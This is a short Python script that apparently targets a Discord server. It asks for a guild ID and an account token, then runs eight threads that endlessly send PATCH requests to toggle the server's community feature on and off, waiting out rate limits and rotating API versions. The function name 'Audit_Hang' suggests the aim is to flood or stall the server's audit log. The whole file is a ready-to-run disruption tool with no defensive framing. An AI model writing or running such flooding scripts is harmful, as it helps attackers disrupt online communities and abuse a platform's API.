import threading; import requests; import json; import time; import random

Guild_ID = input("Guild ID > ")
t = input("Token >"); headers = {
  "Authorization": t
}

a = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
}

a2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
}

def CommunityFlood():
    global Guild_ID
    while True:
        try:
            r = requests.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{Guild_ID}", headers=headers, json=a2)
            s = [200, 201, 204]
            if r.status_code in s:
                print("Created community")
            elif r.status_code == 429:
                b = r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
        except:
            pass
        try:  
            r = requests.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{Guild_ID}", headers=headers, json=a)
            s = [200, 201, 204]
            if r.status_code in s:
                print("Disabled community")
            elif r.status_code == 429:
                b = r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
        except:
            pass


def Audit_Hang():
    for i in range(8):
        t = threading.Thread(target=CommunityFlood)
        t.start()

Audit_Hang()
